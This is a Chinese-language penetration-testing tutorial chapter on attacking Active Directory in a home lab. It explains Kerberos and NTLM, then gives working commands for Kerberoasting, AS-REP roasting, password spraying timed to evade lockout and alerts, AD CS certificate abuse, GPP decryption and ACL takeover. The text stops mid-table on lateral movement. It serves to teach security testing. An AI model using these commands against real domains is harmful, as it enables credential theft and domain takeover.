# 第 4 章 · 内网与 Active Directory

> 对应路线：**阶段 4**（5 周）
> 前置要求：完成第 1、2 章；本机已装 UTM（用于 Windows VM）
> 本章目标：拿到一台域内主机后，能枚举、提权、横向，最终拿下域控

---

## 0. 为什么要学内网 / AD

- **企业环境 90% 是 AD**：真实渗透测试中，拿下 web 只是第一步，真正的目标是域控。
- **薪资更高**：内网渗透能力是初级与中级渗透工程师的分水岭。
- **本机已备齐工具**（本章开头已实测）：
  `netexec(nxc)`、`impacket` 全家桶、`bloodhound-python`、`enum4linux-ng`、`certipy`、`proxychains4`。

---

## 1. 基础概念（必读，这一节请慢读）

> 这一节是整个第 4 章的地基。**后面所有攻击，本质都是"滥用 Kerberos 认证流程中的一个设计缺陷"**。
> 如果这里没看懂，后面会变成抄命令。请务必读完。

### 1.1 Active Directory 是什么

**一句话**：AD 是一个"公司的人员、电脑、权限的中央登记册"，由微软在 2000 年推出，至今仍是 90% 企业内网的核心。

**为什么需要它？** 设想一个公司有 5000 台电脑、8000 个员工：

- 没有 AD 时：每台电脑各自存自己的账号密码，员工换部门要IT手动改；新员工入职要一台台配。
- 有了 AD 后：所有人、所有电脑的信息集中在一台（或几台）服务器上。员工登录任何一台机器，都去这台服务器验证。

这台"中央服务器"就是**域控（Domain Controller，简称 DC）**。

| 组件 | 通俗解释 | 渗透中的意义 |
|---|---|---|
| **Domain（域）** | 一个管理边界，命名如 `corp.local` | 攻击范围 |
| **DC（域控）** | 存所有账号密码的服务器 | **终极目标**，拿下它=拿下整个域 |
| **User（用户）** | 域账号，写作 `CORP\alice` | 横向的跳板 |
| **Computer（计算机）** | 加入域的机器 | 立足点 |
| **Group（组）** | 权限的集合 | 提权的关键（见下） |
| **OU（组织单位）** | 类似文件夹，用于分类管理对象 | 影响 GPO 作用范围 |
| **GPO（组策略）** | 管理员统一下发的配置 | 可能含密码！ |
| **SPN（服务主体名）** | 服务的唯一标识，如 `MSSQLSvc/sql.corp.local:1433` | Kerberoasting 的入口 |

**几个必须记住的组**：

| 组名 | 权限 | 为什么重要 |
|---|---|---|
| `Domain Admins` | 域内最高权限 | 拿到它=拿到域 |
| `Domain Users` | 所有普通用户 | 默认都在 |
| `Enterprise Admins` | 跨域最高权限（仅根域有） | 多域环境终极目标 |
| `Account Operators` | 可创建/修改账号 | 常被忽视的提权跳板 |
| `Backup Operators` | 可备份任意文件 | 能读 DC 的 NTDS.dit |

**一个关键概念：SID**

每个对象（用户、组、机器）都有一个唯一编号 SID，形如：

```
S-1-5-21-1004336348-1177238915-682003330-1103
└─┬─┘ └──────────┬──────────┘└──┬──┘ └┬┘
 版本      域标识（32位随机数）    RID
```

- **域 SID** = `S-1-5-21-1004336348-1177238915-682003330`（同一个域里所有对象共享）
- **RID** = 最后一段，区分不同对象
- **RID 500** = 内置 Administrator（每台机器/每个域都有）
- **RID 502** = krbtgt（Kerberos 服务账号，黄金票据的关键）

> **记住这一点**：伪造黄金票据时，你需要"域 SID"，就是上面那串 `S-1-5-21-...`。

---

### 1.2 认证流程：Kerberos（核心，务必逐句读懂）

**为什么是 Kerberos？** 早期协议（如 NTLM）在网络上传来传去，容易被截获。Kerberos 的设计目标是：
**"密码永不在网络上传输，用票据（Ticket）代替。"**

**三个角色**：

```
   ┌─────────┐         ┌──────────┐         ┌──────────┐
   │  客户端  │         │    KDC    │         │  服务端   │
   │ (用户)   │         │  (=DC)    │         │(文件服务器)│
   └─────────┘         └──────────┘         └──────────┘
                          │
                    ┌─────┴─────┐
                    │ AS + TGS  │
                    └───────────┘
```

KDC（Key Distribution Center，密钥分发中心）就是 DC，它有两个服务：

- **AS（Authentication Service）**：负责"你是谁"——发放 TGT
- **TGS（Ticket Granting Service）**：负责"你能访问啥"——发放服务票据

**完整认证流程（6 步，请对照图看）**：

```
① 客户端 → AS：我是 alice，我要登录
    （AS-REQ，其中的"预认证"部分用 alice 的密码哈希加密时间戳）

② AS → 客户端：验证通过，给你一张 TGT
    （AS-REP，TGT 用 krbtgt 的密钥加密，客户端解不开但能带着走）

    ┌──────────────────────────────────────┐
    │ TGT = 用户信息 + 时间戳 + 会话密钥     │
    │       加密密钥 = krbtgt 的 NTLM 哈希  │ ← 关键！
    └──────────────────────────────────────┘

③ 客户端 → TGS：我有 TGT，我要访问 文件服务器
    （TGS-REQ，带着 TGT）

④ TGS → 客户端：验证 TGT 有效，给你一张服务票据
    （TGS-REP，服务票据用"服务账号的密码哈希"加密）

    ┌──────────────────────────────────────┐
    │ 服务票据 = 用户信息 + 权限             │
    │       加密密钥 = 服务账号的 NTLM 哈希  │ ← 关键！
    └──────────────────────────────────────┘

⑤ 客户端 → 文件服务器：这是我的服务票据
⑥ 文件服务器：用自己账号的哈希解密 → 验证通过 → 允许访问
```

**这个流程里藏着三个致命弱点**（就是三大攻击）：

| 步骤 | 弱点 | 对应攻击 | 为什么能打 |
|---|---|---|---|
| ① 的预认证 | 预认证**可以被关闭** | **AS-REP Roasting** | 关闭后 AS 直接返回用用户密码加密的数据，可离线破解 |
| ④ 的服务票据 | 用**服务账号密码哈希**加密 | **Kerberoasting** | 任何域用户都能请求服务票据，拿到后离线破解服务账号密码 |
| ② 的 TGT | 用 **krbtgt 哈希**加密 | **Golden Ticket** | 拿到 krbtgt 哈希后，可伪造任意用户的 TGT |

**关键理解：为什么这些攻击能"离线破解"？**

因为 Kerberos 的加密是"对称加密"——**加密和解密用同一个密钥**。服务器把票据发给你时，用的是"密码的哈希"当密钥。这意味着：

1. 你拿到了一张加密的票据（你有密文）
2. 你知道加密算法（Kerberos 用 RC4 或 AES）
3. 但**你不知道密钥**（就是密码的哈希）
4. 于是你可以：**猜一个密码 → 算它的哈希 → 拿哈希解密票据 → 看解出来对不对**
5. 这个计算完全在你本地做，可以疯狂并行，不受服务器限速影响

这就是"离线破解"。速度快，且不会触发账号锁定。

**四大攻击对照表（必背）**：

| 攻击 | 需要的条件 | 拿到什么 | 破解难度 |
|---|---|---|---|
| **AS-REP Roasting** | 目标账号关闭了预认证 | 用用户密码加密的 AS-REP | 中（取决于密码强度） |
| **Kerberoasting** | 任意一个有效域账号 | 用服务账号密码加密的 TGS | 中（服务账号常是弱密码） |
| **Golden Ticket** | krbtgt 的 NTLM 哈希 + 域 SID | 可伪造任意 TGT | 无需破解（直接伪造） |
| **Silver Ticket** | 某服务账号的 NTLM 哈希 | 可伪造该服务的票据 | 无需破解，但作用范围小 |

**为什么 Kerberoasting 特别流行？**

1. 只需一个**最普通的域账号**就能发起（默认所有域用户都能请求服务票据）
2. 服务账号（如 `svc_sql`、`svc_backup`）往往：
   - 用**弱密码**（因为要写在脚本/配置里，方便记忆）
   - **很少改密码**（改了要改一堆配置）
   - **权限很大**（可能是某台服务器的管理员）
3. 攻击**不会被日志记录为异常**（请求服务票据是正常操作）

---

### 1.3 NTLM 是什么（必须理解，横向的基础）

Kerberos 不是唯一的认证方式。当以下情况发生时，会**退回到 NTLM**：

- 用 IP 地址而不是主机名访问（Kerberos 需要主机名）
- 访问不在同一域的资源
- 某些遗留应用

**NTLM 认证流程（简化的"挑战-应答"）**：

```
① 客户端 → 服务端：我要登录（提供用户名）
② 服务端 → 客户端：给你一个随机数（Challenge）
③ 客户端 → 服务端：用"密码的哈希"加密这个随机数，返回（Response）
④ 服务端：用同样的哈希解密 → 对比 → 通过
```

**关键漏洞：密码的哈希就是"通行证"**

注意第 ③ 步：客户端用的是**密码的哈希**，而不是密码本身。这意味着：

> **如果你拿到了哈希，你就等于拿到了密码**（至少在网络认证层面）。

这就是 **Pass-the-Hash（PtH，哈希传递）** 的原理——不需要破解出明文密码，直接拿哈希去认证。

**NTLM 哈希长什么样**：

```
aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
└────────── LM 哈希 ──────────┘ └────────── NT 哈希 ──────────┘
   （现代系统通常值为固定的空哈希）
```

- **LM 哈希**：老古董，现代 Windows 默认禁用，常显示为那个固定的 `aad3b435...`
- **NT 哈希**：真正有用的部分，**这才是 PtH 用的**

**为什么 aad3b435b51404eeaad3b435b51404ee 是固定的？**

因为它就是**空字符串的 LM 哈希**。现代系统不存 LM 哈希了，所以这个字段填一个固定值占位。看到这串，说明"LM 哈希无效"，只用冒号后面那半截。

---

### 1.4 常见端口（扫描时按这个表判断）

```bash
# 一条命令扫出域内机器的"指纹"
nmap -Pn -p 53,88,135,139,389,445,464,636,3268,3269,5985,5986 <IP>
```

| 端口 | 服务 | 用途 | 渗透中的意义 |
|---|---|---|---|
| 53 | DNS | 域名解析 | **DC 必有**，域内服务发现靠它 |
| 88 | Kerberos | 认证 | **DC 必有**，看到 88 基本确定是 DC |
| 135 | RPC | 远程调用 | WMI 横向依赖它 |
| 139 | NetBIOS | 老式文件共享 | — |
| 389 | LDAP | 目录查询 | **枚举用户/组的主力** |
| 445 | SMB | 文件共享 | 横向、枚举、PtH 的主战场 |
| 464 | kpasswd | 改密码 | — |
| 636 | LDAPS | LDAP over TLS | 加密的目录查询 |
| 3268 | Global Catalog | 全局目录 | 多域查询 |
| 3269 | GC over TLS | 加密全局目录 | — |
| 5985 | WinRM HTTP | 远程管理 | **最隐蔽的横向方式** |
| 5986 | WinRM HTTPS | 加密远程管理 | — |
| 1433 | MSSQL | 数据库 | 常有服务账号（Kerberoasting 目标） |
| 3389 | RDP | 远程桌面 | 图形化横向 |

**一句话判断是不是 DC**：看到 **88 + 389 + 445 + 53** 同时开放，几乎可以确定是域控。

---

## 2. 环境准备（关键：搭建本地 AD 靶场）

### 2.1 方案 A：自建最小域环境（推荐，完全免费）

**所需**（UTM 已装）：

| 虚拟机 | 系统 | 配置 | 角色 |
|---|---|---|---|
| DC01 | Windows Server 2022 ARM | 4 核 / 4GB / 60GB | 域控 |
| WS01 | Windows 11 ARM | 4 核 / 4GB / 60GB | 成员机 |
| Kali | 已有 `kali` 容器 | — | 攻击机 |

**搭建步骤**：

```
【DC01】
1. UTM 新建虚拟机 → 虚拟化 → Windows → 导入 Windows Server ISO
2. 装完后：
   - 改主机名：DC01
   - 设静态 IP：192.168.64.10
3. 服务器管理器 → 添加角色和功能 → 勾选 "Active Directory 域服务"
4. 提升为域控：
   - 添加新林 → 根域名：lab.local
   - 设置 DSRM 密码
   - 重启
5. 建测试账号（PowerShell 管理员）：
```

```powershell
# DC01 上执行
Import-Module ActiveDirectory

New-ADUser -Name "alice" -SamAccountName "alice" `
  -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) `
  -Enabled $true

New-ADUser -Name "bob" -SamAccountName "bob" `
  -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) `
  -Enabled $true

# 建一个服务账号（用于 Kerberoasting 练习）
New-ADUser -Name "svc_sql" -SamAccountName "svc_sql" `
  -AccountPassword (ConvertTo-SecureString "Summer2024!" -AsPlainText -Force) `
  -Enabled $true
Set-ADUser -Identity svc_sql -ServicePrincipalNames @{Add="MSSQLSvc/sql.lab.local:1433"}

# 加入 Domain Admins
Add-ADGroupMember -Identity "Domain Admins" -Members "alice"
```

```
【WS01】
1. 装 Windows 11，设 IP 192.168.64.20，DNS 指向 192.168.64.10
2. 系统属性 → 更改 → 域 → 输入 lab.local
3. 用域账号登录
```

**攻击机连通性验证**：

```bash
docker exec -it kali bash

# 确认能访问 DC
nmap -Pn -p 88,389,445,5985 192.168.64.10
```

### 2.2 方案 B：不搭 VM，用免费在线靶场

| 平台 | 靶场 | 说明 |
|---|---|---|
| **TryHackMe** | `Attacktive Directory` | AD 入门经典，免费 |
| **TryHackMe** | `Attacking Kerberos` | Kerberos 攻击，免费 |
| **Hack The Box** | Starting Point | 免费入门机器 |
| **HackMyVM** | AD 系列机器 | 完全免费 |

两条路可并行：**方案 B 学理论，方案 A 练手**。

---

## 3. 主线实战：完整攻击链

> 下面是一条**真实的完整攻击路径**：从"什么都不知道"到"拿下域控"。
> 每一步我都会先讲**为什么这么做**，再给命令，最后解释**输出怎么看**。

**攻击链全景图**：

```
[零信息]
   │
   ├─① 信息收集 ──→ 拿到：域名、用户列表、机器列表
   │
   ├─② 获取凭据 ──→ 拿到：第一个域账号（密码或哈希）
   │      ├─ AS-REP Roasting（无需凭据）
   │      ├─ 密码喷洒（用已知弱密码试多账号）
   │      └─ Kerberoasting（需一个普通账号）
   │
   ├─③ 枚举构图 ──→ 用 BloodHound 找出到 DC 的最短路径
   │
   ├─④ 提权     ──→ 提升到本地管理员 / 服务账号
   │
   ├─⑤ 横向     ──→ 从一台机器跳到另一台
   │
   └─⑥ 拿下 DC  ──→ DCSync 导出所有哈希 → 伪造黄金票据
```

---

### 3.1 第 1 步：信息收集（无凭据）

**目标**：在没有任何账号的情况下，尽可能多地了解这个域。

**为什么能做到"无凭据枚举"？**

这是 AD 的设计特性——**为了兼容性和易用性，AD 默认允许匿名或低权限查询大量信息**：

- **SMB**：允许匿名连接，可以列出共享、用户、密码策略
- **LDAP**：默认允许匿名绑定（LDAP 是"读多写少"的目录服务）
- **RPC**：`rpcclient` 匿名可枚举域用户和组
- **DNS**：DC 的 DNS 会暴露大量主机名

这些是**合法的管理功能**，但攻击者可用它们做侦察。

```bash
TARGET=192.168.64.10
DOMAIN=lab.local

# ---- 1. 端口扫描：先确认是不是 DC ----
nmap -Pn -sV -sC -p 53,88,135,139,389,445,464,636,3268,5985 $TARGET

# ---- 2. 综合枚举（enum4linux-ng 一把梭）----
enum4linux-ng -A $TARGET
# -A = All，做全部检查。输出会分模块：Sessions / Shares / Users / Groups / Policy

# ---- 3. SMB 枚举（最常用）----
nxc smb $TARGET                       # 基础信息：主机名/域名/系统版本/签名
nxc smb $TARGET --shares              # 列出共享目录
nxc smb $TARGET --users               # 枚举域用户
nxc smb $TARGET --groups              # 枚举域组
nxc smb $TARGET --pass-pol            # 密码策略（重要！见下）

# ---- 4. RPC 枚举（匿名成功率高）----
rpcclient -U "" -N $TARGET
  > enumdomusers                      # 列出所有域用户
  > enumdomgroups                     # 列出所有域组
  > querydominfo                      # 域信息
  > queryuser 0x1f4                   # 查具体用户（RID 视角）
  > exit

# ---- 5. LDAP 枚举（信息最全）----
ldapsearch -x -H ldap://$TARGET -b "dc=lab,dc=local" "(objectClass=user)" sAMAccountName
```

**关键：为什么要先看密码策略？**

```bash
nxc smb $TARGET --pass-pol
```

输出形如：

```
Password Policy:
  Minimum password length: 7
  Password history length: 24
  Maximum password age: 42 days
  Account lockout threshold: 5        ← 关键！
  Account lockout duration: 30 min
```

**`Account lockout threshold` 决定你能不能用密码喷洒**：

- 如果阈值是 **0** → 不会锁定 → 可以疯狂爆破
- 如果是 **5** → 一个账号连错 5 次就锁 → 必须小心控制节奏
- **喷洒（Spraying）** 就是为了规避锁定：不是"一个账号试100个密码"，而是"100个账号各试1个密码"

**用户名枚举技巧——从输出格式找线索**：

```bash
# 常见用户名规律
# 中文名 → pinyin: zhangwei, wei.zhang, zw
# 服务账号 → 服务名_用途: svc_sql, svc_backup, sql_svc, _svc_jenkins
# 管理员 → administrator, admin, adm
# 测试账号 → test, temp, demo, guest
```

**小技巧：用 RID 循环枚举所有用户**

即使 `enumdomusers` 被禁，也可以按 RID 暴力枚举：

```bash
# RID 从 500 到 2000 依次查
for rid in $(seq 500 1100); do
  rpcclient -U "" -N $TARGET -c "queryuser $rid" 2>/dev/null | grep -i "user name"
done
```

> **原理**：RID 是连续分配的，攻击者只要知道 RID 起点，就能枚举出所有用户，
> 这就是著名的 **"RID Cycling"**。很多企业以为隐藏用户名就安全了，其实并没有。

---

### 3.2 第 2 步：获取初始凭据

**为什么这一步最关键？** 因为有了**任意一个**域账号，可选攻击面会瞬间扩大十倍。

#### 手法 A：AS-REP Roasting（无需任何凭据）

**原理回顾**：正常情况，登录第一步（AS-REQ）需要先"预认证"——用你的密码哈希加密一个时间戳发给 DC。
DC 验证通过才返回 TGT。

但如果某个账号**关闭了预认证**（PowerShell 里勾了 `Do not require Kerberos preauthentication`），
那么 DC 会**直接返回 AS-REP**，而这个 AS-REP 的**一部分是用该用户的密码哈希加密的**。

于是：**你不需要密码，就能拿到一个"用密码加密的数据块"，然后离线暴力破解它。**

```
正常流程（有预认证）：
  你 ──AS-REQ(含加密时间戳)──→ DC ──验证──→ 返回 TGT
  攻击者：拿不到任何可破解的东西

关闭预认证后：
  你 ──AS-REQ(不含时间戳)──→ DC ──直接返回 AS-REP──→ 你
                                        ↑
                          这段用用户密码哈希加密，可以离线破解！
```

```bash
# 1. 准备用户名字典（来自上面的枚举结果）
cat > users.txt <<'EOF'
alice
bob
svc_sql
administrator
EOF

# 2. 批量请求 AS-REP（-no-pass 表示不用密码）
impacket-GetNPUsers lab.local/ -dc-ip $TARGET -no-pass \
    -usersfile users.txt -format hashcat -outputfile asrep.hash

# 输出形如：
# $krb5asrep$23$alice@LAB.LOCAL:xxxxxxxxxxxxxxxx$yyyyyyyy...

# 3. 离线破解
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt

# 或 john
john --wordlist=/usr/share/wordlists/rockyou.txt asrep.hash
```

**hashcat 模式号速查**（记不住就查表）：

| 哈希类型 | hashcat `-m` | john 格式 |
|---|---|---|
| AS-REP (etype 23, RC4) | **18200** | krb5asrep |
| AS-REP (etype 17/18, AES) | 19800 / 19900 | krb5asrep |
| Kerberoast (etype 23, RC4) | **13100** | krb5tgs |
| Kerberoast (AES) | 19600 / 19700 | krb5tgs |
| NTLM | **1000** | nt |
| NetNTLMv2 | **5600** | netntlmv2 |

> **为什么都是 etype 23/17/18？**
> 这些是 Kerberos 的加密类型编号。23 = RC4-HMAC（最弱、最好破），
> 17 = AES128，18 = AES256（更强）。企业若禁用 RC4，破解难度会大增。

#### 手法 B：密码喷洒（Password Spraying）

**原理**：很多企业存在"**通用弱密码**"现象——

- 新员工入职统一设 `Company@2024`，很多人没改
- 节假日/季节密码：`Summer2024`、`Spring2025`
- 公司名+数字：`Corp123`、`Company@123`

**"喷洒"vs"爆破"的区别**：

```
爆破（Brute Force）：
  alice → 试 10000 个密码   ← 1 个账号被打爆，立刻触发锁定

喷洒（Spraying）：
  alice   → 试 1 个密码
  bob     → 试 1 个密码
  carol   → 试 1 个密码
  ... 1000 个账号
  然后换下一个密码再轮一遍   ← 每个账号只错 1 次，不触发锁定
```

```bash
# 关键参数：--continue-on-success 表示找到有效凭据后继续
nxc smb $TARGET -u users.txt -p 'Password123!' --continue-on-success
nxc smb $TARGET -u users.txt -p 'Summer2024!' --continue-on-success

# 控制节奏（避免锁定）
nxc smb $TARGET -u users.txt -p 'Pass1' --continue-on-success --delay 5
```

**必须遵守的纪律**：

1. **先看密码策略**（3.1 节），确认锁定阈值
2. **轮次间隔要大于锁定窗口**（如锁 30 分钟，就每 31 分钟一轮）
3. **正常业务时间操作**，避免半夜触发告警

#### 手法 C：Kerberoasting（需要任意一个域账号）

**这是 AD 渗透中最经典、最实用的攻击。**

**原理**：任何域用户都可以请求**任意 SPN 对应的服务票据**。
而服务票据是用**该服务账号的密码哈希**加密的。

所以：**用你自己的普通账号去要一张别人的服务票据 → 拿回来离线破解服务账号的密码。**

```
你(alice, 普通用户)
   │
   │  "我要访问 MSSQLSvc/sql.lab.local:1433 的服务"
   ▼
  DC ──返回 TGS票据──→ 你
        ↑
   这段用 svc_sql 的密码哈希加密
        ↓
   离线破解 → 拿到 svc_sql 的密码
```

**为什么服务账号密码好破？**

- 服务账号常见弱密码：`Summer2024!`、`P@ssw0rd`、`sql2019`
- 且**几乎从不改密码**（改密码要改一堆配置文件）
- 且**权限往往很大**（常常是某台服务器的本地管理员）

```bash
# 请求所有 SPN 对应的服务票据
impacket-GetUserSPNs lab.local/alice:'Password123!' -dc-ip $TARGET \
    -request -outputfile kerb.hash

# 输出会显示所有可攻击的服务账号：
# ServicePrincipalName              Name      MemberOf
# MSSQLSvc/sql.lab.local:1433       svc_sql   CN=Domain Admins ← 权限很大！

# 离线破解
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
# 预期破解出：svc_sql:Summer2024!
```

**进阶：如果 RC4 被禁用怎么办？**

企业若禁用 RC4，票据会用 AES 加密，破解成本暴增。此时可以：

```bash
# 请求 AES 加密的票据（需要指定 etype）
impacket-GetUserSPNs lab.local/alice:'Password123!' -dc-ip $TARGET \
    -request -outputfile kerb_aes.hash

hashcat -m 19700 kerb_aes.hash /usr/share/wordlists/rockyou.txt   # AES256
```

> **实战提示**：Kerberoasting 的成败几乎完全取决于**字典质量**。
> 除了 rockyou.txt，建议准备针对性的企业密码字典（季节、公司名、常见变体）。

---

### 3.3 第 3 步：枚举与 BloodHound 构图

**为什么需要 BloodHound？**

在真实内网里，从"你手上这个普通账号"到"Domain Admin"往往**不是一步**，而是：

```
普通用户 alice
  → alice 对 OU=IT 有 GenericWrite 权限
  → 可以给 bob 加 SPN（变成可 Kerberoast）
  → bob 是 服务器 WEB01 的本地管理员
  → WEB01 上有 Domain Admin 的登录会话
  → 从 WEB01 内存里 dump 出 DA 的凭据
  → 拿下域
```

**人脑很难从几千个对象、上万条关系里找出这条路径**。BloodHound 用图数据库自动算出来。

**核心概念：BloodHound 里的"边"（关系）**

| 关系 | 含义 | 能干什么 |
|---|---|---|
| `MemberOf` | 成员关系 | 组权限继承 |
| `AdminTo` | 本地管理员 | 可登录该机器 |
| `HasSession` | 该机器上有此用户的会话 | **可 dump 该用户凭据** |
| `GenericAll` | 完全控制 | 可改密码/加组 |
| `GenericWrite` | 写属性 | 可加 SPN → Kerberoast |
| `WriteDacl` | 改权限 | 可给自己加权限 |
| `ForceChangePassword` | 强制改密码 | 直接接管账号 |
| `DCSync` | 复制目录 | **直接导出所有哈希** |
| `CanPSRemote` | WinRM 远程 | 横向 |
| `AllowedToDelegate` | 委派 | 可冒充别人 |

**为什么 `HasSession` 这么重要？**

Windows 有个特性：**用户登录后，其凭据（哈希）会缓存在内存里**（LSASS 进程）。

```
WEB01 机器
├─ 服务账号 svc_web（内存里有它的哈希）
├─ 管理员 admin（远程 RDP 登录过，内存里留了哈希）← 关键！
└─ 普通用户 alice
```

所以：**如果你能成为 WEB01 的本地管理员，就能从这个"被污染的机器"上偷到 Domain Admin 的哈希。**

这就是**横向移动的本质**：不断寻找"有高权限用户登录过的机器"。

```bash
# 用拿到的凭据收集全部 AD 数据
bloodhound-python -u svc_sql -p 'Summer2024!' -d lab.local -ns $TARGET -c all

# -c all 表示收集：组、用户、计算机、会话、ACL、GPO、信任关系
# 生成一堆 .json 文件
ls *.json
```

**导入 BloodHound 的两种方式**：

```bash
# 方式 1：BloodHound CE（图形界面，推荐）
# 安装：apt install bloodhound
# 启动：bloodhound
# 默认账号 admin / 首次启动会提示改密码
# 然后：Administration → File Ingest → 上传 zip/json

# 方式 2：无 GUI 环境，用 curl 直接查 Neo4j
# 先启动 neo4j（BloodHound CE 自带）
# 然后写 Cypher 查询（见下）
```

**常用 Cypher 查询（直接抄）**：

```cypher
// 1. 找出所有 Domain Admin
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@LAB.LOCAL"})
RETURN u.name

// 2. 当前用户到 DA 的最短路径
MATCH (u:User {owned:true}), (g:Group {name:"DOMAIN ADMINS@LAB.LOCAL"}),
      p = shortestPath((u)-[*1..]->(g))
RETURN p

// 3. 找出所有可以 DCSync 的对象
MATCH (n)-[:DCSync|GetChanges|GetChangesAll]->(d:Domain)
RETURN n.name

// 4. 找出有高权限用户会话的机器
MATCH (c:Computer)-[:HasSession]->(u:User)
WHERE u.admincount = true
RETURN c.name, u.name

// 5. 找出所有 Kerberoastable 用户
MATCH (u:User) WHERE u.hasspn = true RETURN u.name, u.serviceprincipalnames
```

**手工分析（无 BloodHound 时）**：

```bash
# 谁有 DCSync 权限
impacket-rpcdump $TARGET | grep -i "MS-DRSR\|DS-Replication"

# 谁能 local admin 到哪台机器
nxc smb 192.168.64.0/24 -u alice -p 'Password123!' -d lab.local

# 谁在哪些机器上有会话（需要管理员权限）
nxc smb 192.168.64.0/24 -u alice -p 'Password123!' --sessions
```

---

### 3.4 第 4 步：提权（域内）

**先说清楚"域内提权"和"本地提权"的区别**：

| 类型 | 目标 | 手段 |
|---|---|---|
| **本地提权** | 普通用户 → 本机管理员 | 系统漏洞、配置错误、SUID、服务权限 |
| **域内提权** | 低权限域用户 → 高权限域用户 | **滥用 AD 本身的配置缺陷** |

本节的"提权"指后者——**不依赖系统漏洞，而是利用 AD 的配置错误**。

**为什么 AD 提权这么容易出问题？**

因为 AD 的权限模型**极其灵活**，管理员可以给任何对象设置任意权限。现实中常见误区：

- "我需要让 alice 能改这个服务的配置" → 给了 `GenericWrite`，但没意识到这等于让她能接管整个服务
- "让这个应用能读取用户信息" → 给了过大的 AD 读取权限
- 部署代码时把 `web.config` 放在共享目录 → 里面有服务账号密码

---

**手法 A：AD CS 滥用（证书服务，近年最热门）**

**原理**：企业常部署 AD CS（证书服务）用于内部 HTTPS、VPN、Wi-Fi 认证等。
证书服务有大量**配置错误**，可被用来**申请一张"冒充管理员"的证书**。

**为什么证书能冒充别人？**

证书认证的流程是：

```
你 ──出示证书──→ 服务器 ──验证证书由 CA 签发──→ 通过，你就是证书里写的那个用户
```

**关键在于"证书里写的你是谁"**。如果模板允许你在申请时**自己指定 UPN（用户名）**，
那么你就能申请一张"写着 administrator"的证书，服务器就会认为你是管理员。

**certipy 能自动检测的漏洞类型**：

| 编号 | 名称 | 原理 |
|---|---|---|
| **ESC1** | 可指定 UPN + 客户端认证 | 申请时自己填 `administrator@lab.local` |
| **ESC2** | 任意用途模板 | 可用于客户端认证 |
| **ESC3** | 注册代理 | 冒充他人申请证书 |
| **ESC4** | 模板 ACL 可写 | 自己改模板 → 变成 ESC1 |
| **ESC5** | PKI 对象 ACL 可写 | 攻击 CA 本身 |
| **ESC6** | `EDITF_ATTRIBUTESUBJECTALTNAME2` | CA 级别允许任意 UPN |
| **ESC7** | CA 管理权限 | 直接签发 |
| **ESC8** | HTTP 端点 NTLM 中继 | 中继到 CA 拿证书 |
| **ESC9/10/11** | 证书映射缺陷 | 更复杂的变体 |

```bash
# 1. 枚举所有证书模板，找出有漏洞的
certipy find -u alice@lab.local -p 'Password123!' -dc-ip $TARGET -vulnerable -stdout

# 输出会明确标注：[!] Vulnerabilities: ESC1

# 2. ESC1 利用：申请一张冒充 administrator 的证书
certipy req -u alice@lab.local -p 'Password123!' \
    -ca LAB-CA -template User \
    -upn administrator@lab.local -dc-ip $TARGET
# 得到 administrator.pfx

# 3. 用证书认证，拿回管理员的 NTLM 哈希
certipy auth -pfx administrator.pfx -dc-ip $TARGET

# 输出：
# [*] Got hash for 'administrator@lab.local': aad3b435...:31d6cfe0...
```

> **为什么这是"提权"而不是"伪造"？** 因为证书是 CA **真签发的**，
> 服务器验证时完全合法。这是配置错误导致的，不是密码被破解。

---

**手法 B：GPP 密码（组策略首选项，经典老漏洞）**

**原理**：早年管理员用 GPP（Group Policy Preferences）**批量下发本地管理员密码**。
密码用 AES-256 加密后存在 `Groups.xml` 里，放在 SYSVOL 共享。

**问题是：微软在 2012 年公开了这个 AES 密钥，从此等于明文。**

```
在线加密密钥（微软公开的）：
  AES Key:   4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8 f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b
  IV:        00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```

所以只要能读到 `Groups.xml`，就能解密出密码。

```bash
impacket-Get-GPPPassword lab.local/alice:'Password123!'@$TARGET

# 输出：Local admin password for ... : MyAdminPass123
```

**为什么现在还常见？** 因为很多老企业的 GPO 是十多年前配的，一直沿用至今。

---

**手法 C：LAPS 密码读取**（有权限时）

**原理**：LAPS（Local Administrator Password Solution）是微软的**正经解决方案**——
它给每台机器**生成一个随机的本地管理员密码**，存在 AD 里，只有被授权的人能读。

**但如果 ACL 配错了**，普通用户也能读到！

```bash
# 直接读
impacket-GetLAPSPassword lab.local/alice:'Password123!' -dc-ip $TARGET

# 或用 nxc 批量读整个网段
nxc ldap $TARGET -u alice -p 'Password123!' -M laps
```

**读取条件**：对计算机对象的 `ms-Mcs-AdmPwd` 属性有读权限。
常见错误配置：把 `Domain Users` 或某个 OU 的所有用户都给了读权限。

---

**手法 D：ACL 滥用（GenericAll / WriteDacl 等）**

如果 BloodHound 显示你对某个用户有 `GenericAll`、`ForceChangePassword` 等权限：

```bash
# 强制改别人密码（ForceChangePassword）
impacket-changepasswd lab.local/alice:'Password123!'@$TARGET \
    -newpass 'NewPass123!' -reset -target bob

# 或者：给自己加 SPN，把自己变成 Kerberoastable（配合其他攻击）
# 或者：给自己加 Domain Admin 组（需要 WriteDacl / GenericAll）

# 用 bloodyAD 做精细 ACL 操作
bloodyAD -u alice -p 'Password123!' -d lab.local --host $TARGET add groupMember "Domain Admins" alice
```

---

### 3.5 第 5 步：横向移动

**核心问题：我有 A 机器的权限，怎么拿到 B 机器的权限？**

**三个必要条件**（缺一不可）：

1. **网络可达**（能连到目标端口，如 445/5985/135）
2. **有可用的凭据**（明文密码 或 NTLM 哈希 或 Kerberos 票据）
3. **该凭据在目标机器上有权限**（是目标的本地管理员，或域管理员）

**第一步永远是这个**：找出"我现在的凭据能登录哪些机器"。

```bash
# 扫整个网段，看哪些机器上当前用户是管理员
nxc smb 192.168.64.0/24 -u svc_sql -p 'Summer2024!' -d lab.local

# 输出里 Pwn3d! 表示你是管理员
# SMB  192.168.64.20  445  WEB01  [*] Windows 11 (Pwn3d!)
```

**五种横向方法对照表**：

| 方法 | 端口 | 原理 | 隐蔽性 | 是否留痕 |
|---|---|---|---|---|
| **WinRM** | 5985/5986 | 用 PowerShell Remoting 执行命令 | ★★★★★ | 日志较少 |
